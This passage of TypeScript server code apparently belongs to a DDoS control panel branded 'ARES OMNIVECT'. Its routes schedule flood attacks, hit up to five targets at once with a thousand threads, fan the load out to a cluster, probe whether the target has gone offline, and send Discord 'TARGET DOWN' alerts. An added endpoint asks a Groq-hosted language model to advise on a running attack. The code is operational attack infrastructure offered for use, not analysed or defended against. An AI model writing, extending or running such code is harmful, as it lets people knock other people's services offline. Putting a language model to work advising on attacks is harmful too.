  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a, "attack_stopped");
  res.json({ ok: true, ...a });
});

// ── AI Advisor — Groq-powered live attack analysis ─────────────────────────
router.get("/attacks/:id/ai-advisor", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const [attack] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
  if (!attack) { res.status(404).json({ error: "Not found" }); return; }
  const pps   = livePps.get(id)     ?? 0;
  const bps   = liveBps.get(id)     ?? 0;
  const conns = attackLiveConns.get(id) ?? 0;
  // Quick target probe
  let targetStatus = "unknown"; let targetLatencyMs = 0;
  try {
    const t0 = Date.now();
    const pr = await fetch(`https://${attack.target}/`, { signal: AbortSignal.timeout(5000), headers: { "User-Agent": "Mozilla/5.0" } });
    targetLatencyMs = Date.now() - t0; targetStatus = String(pr.status);
  } catch { targetStatus = "offline"; }
  try {
    const advice = await groqAdvisor(attack, pps, bps, conns, targetStatus, targetLatencyMs);
    res.json({ ...advice, metrics: { pps, bps, conns, targetStatus, targetLatencyMs, running: attackAborts.has(id) } });
  } catch (e) { res.status(503).json({ error: "AI advisor unavailable", detail: String(e) }); }
});

// ── Scheduled attacks ──────────────────────────────────────────────────────
router.post("/attacks/schedule", (req, res): void => {
  const { target, port, method, duration, threads, scheduledFor, webhookUrl } = req.body as Record<string, unknown>;
  if (!target || !port || !method || !duration || !threads || !scheduledFor) {
    res.status(400).json({ error: "Missing: target, port, method, duration, threads, scheduledFor" }); return;
  }
  const fireAt = new Date(scheduledFor as string).getTime();
  if (isNaN(fireAt) || fireAt <= Date.now()) {
    res.status(400).json({ error: "scheduledFor must be a future ISO timestamp" }); return;
  }
  const sid = `sched_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
  const sa: ScheduledAttack = {
    id: sid, target: String(target), port: Number(port),
    method: String(method), duration: Number(duration), threads: Number(threads),
    webhookUrl: webhookUrl ? String(webhookUrl) : undefined,
    scheduledFor: fireAt, createdAt: Date.now(),
  };
  scheduledAttacks.set(sid, sa);
  res.status(201).json(sa);
});

router.delete("/attacks/scheduled/:sid", (req, res): void => {
  const { sid } = req.params;
  if (!scheduledAttacks.has(sid)) { res.status(404).json({ error: "Scheduled attack not found" }); return; }
  scheduledAttacks.delete(sid);
  res.json({ ok: true, deleted: sid });
});

// ── Multi-target simultaneous attack ──────────────────────────────────────
router.post("/attacks/multi", async (req, res): Promise<void> => {
  const { targets, port, method, duration, threads, webhookUrl } = req.body as {
    targets: string[]; port?: number; method?: string; duration?: number; threads?: number; webhookUrl?: string;
  };
  if (!Array.isArray(targets) || targets.length === 0) {
    res.status(400).json({ error: "targets must be a non-empty array" }); return;
  }
  if (targets.length > 5) { res.status(400).json({ error: "Maximum 5 simultaneous targets" }); return; }
  const results: (typeof attacksTable.$inferSelect)[] = [];
  for (const tgt of targets) {
    const [atk] = await db.insert(attacksTable).values({
      target: tgt, port: port ?? 443, method: method ?? "geass-override",
      duration: duration ?? 60, threads: threads ?? 1000,
      status: "running", packetsSent: 0, bytesSent: 0,
      webhookUrl: webhookUrl ?? null,
    }).returning();
    const aid = atk.id;
    const ctrl = new AbortController();
    const endMs = Date.now() + (duration ?? 60) * 1000;
    attackAborts.set(aid, ctrl);
    attackTimers.set(aid, setTimeout(() => ctrl.abort("duration_expired"), (duration ?? 60) * 1000));
    attackEndTimes.set(aid, endMs);
    livePackets.set(aid, 0); liveBytes.set(aid, 0);
    livePps.set(aid, 0);     liveBps.set(aid, 0);
    prevPktsSnap.set(aid, 0); prevBytesSnap.set(aid, 0);
    if ((method ?? "geass-override") === "geass-override") fanOutToCluster(tgt, port ?? 443, "geass-override", duration ?? 60, threads ?? 1000);
    void runAttackWorkers(method ?? "geass-override", tgt, port ?? 443, threads ?? 1000, ctrl.signal,
      (pkts, bytes, conns) => onWorkerStats(aid, pkts, bytes, conns)
    ).finally(async () => {
      const pp = dbBatchPkts.get(aid) ?? 0; const bb = dbBatchBytes.get(aid) ?? 0;
      dbBatchPkts.delete(aid); dbBatchBytes.delete(aid);
      if (pp > 0 || bb > 0) {
        addStats(aid, pp, bb).catch(err =>
          console.warn(`[SCHED-FINALLY] addStats flush failed for #${aid}:`, err instanceof Error ? err.message : err)
        );
      }
      attackLiveConns.delete(aid); livePackets.delete(aid); liveBytes.delete(aid);
      livePps.delete(aid);         liveBps.delete(aid);
      prevPktsSnap.delete(aid);    prevBytesSnap.delete(aid);
      const t = attackTimers.get(aid); if (t) clearTimeout(t);
      attackTimers.delete(aid); attackAborts.delete(aid); attackEndTimes.delete(aid);
      setTimeout(() => liveTimeseries.delete(aid), 60_000);
      try {
        const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, aid));
        if (cur?.status === "running") {
          const [fin] = await db.update(attacksTable).set({ status: "finished", stoppedAt: new Date() })
            .where(eq(attacksTable.id, aid)).returning();
          if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
        }
      } catch (err) {
        console.warn(`[SCHED-ATTACK #${aid}] DB finalize failed:`, err instanceof Error ? err.message : err);
      }
    });
    results.push(atk);
  }
  res.status(201).json({ attacks: results, count: results.length });
});

// ── Kill Webhook notify — fire Discord/custom webhook with attack kill confirmation ──
router.post("/notify", async (req, res): Promise<void> => {
  const { webhookUrl, attackId, event, message } = req.body as Record<string, string>;
  if (!webhookUrl) { res.status(400).json({ error: "webhookUrl is required" }); return; }
  let attackData: typeof attacksTable.$inferSelect | null = null;
  if (attackId) {
    try {
      const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, parseInt(attackId, 10)));
      attackData = a ?? null;
    } catch (err) {
      console.warn("[NOTIFY] DB fetch failed:", err instanceof Error ? err.message : err);
    }
  }
  const evt = event ?? "target_down";
  const desc = message ?? (attackData ? `Target **${attackData.target}** confirmed OFFLINE` : "Target confirmed OFFLINE");
  const payload = {
    username: "Lelouch Britannia",
    avatar_url: "https://i.imgur.com/ZHKmhI7.png",
    embeds: [{
      title: evt === "target_down" ? "🔴 TARGET DOWN — GEASS CONFIRMED" : "⚔️ LELOUCH BRITANNIA — ATTACK EVENT",
      description: desc,
      color: evt === "target_down" ? 0xFF0000 : 0xFF6600,
      fields: (() => {
        if (!attackData) return [{ name: "Event", value: evt, inline: true }];
        const ad = attackData;
        return [
          { name: "🎯 Target",       value: `\`${ad.target}\``,  inline: true },
          { name: "⚔️ Method",       value: `\`${ad.method}\``,  inline: true },
          { name: "⏱ Duration",      value: `${ad.duration}s`,   inline: true },
          { name: "📦 Packets Sent",  value: (livePackets.get(ad.id) ?? ad.packetsSent ?? 0).toLocaleString(), inline: true },
          { name: "📊 PPS at Kill",   value: (livePps.get(ad.id) ?? 0).toLocaleString(),                  inline: true },
          { name: "🔌 Status",        value: ad.status,           inline: true },
        ];
      })(),
      timestamp: new Date().toISOString(),
      footer: { text: "Lelouch Britannia • ARES OMNIVECT ∞ v3" },
    }],
  };
  try {
    const r = await fetch(webhookUrl, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload), signal: AbortSignal.timeout(6000),
    });
    res.json({ ok: true, status: r.status });
  } catch (e) { res.status(503).json({ error: "Webhook delivery failed", detail: String(e) }); }
});

export default router;
